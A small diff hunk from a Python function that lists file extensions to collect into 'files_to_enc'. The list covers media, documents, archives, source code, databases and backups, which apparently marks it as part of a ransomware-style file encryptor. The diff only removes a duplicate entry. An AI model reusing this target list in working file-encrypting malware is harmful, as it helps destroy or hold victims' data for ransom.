@@ -119,8 +119,8 @@ def select_files():
            ".m2ts", ".mkv", ".mov", ".mp4", ".mpg", ".mpeg",
            ".rm", ".swf", ".vob", ".wmv" ".docx", ".pdf",".rar",
            ".jpg", ".jpeg", ".png", ".tiff", ".zip", ".7z", ".exe", 
-           ".tar.gz", ".tar", ".mp3", ".sh", ".c", ".cpp", ".h",
-           ".mov", ".gif", ".txt", ".py", ".pyc", ".jar", ".sql",
+           ".tar.gz", ".tar", ".mp3", ".sh", ".c", ".cpp", ".h", 
+	   ".gif", ".txt", ".py", ".pyc", ".jar", ".sql",
 	   ".sqlite3", ".html", ".php", ".log", ".bak"]
            
     files_to_enc = []
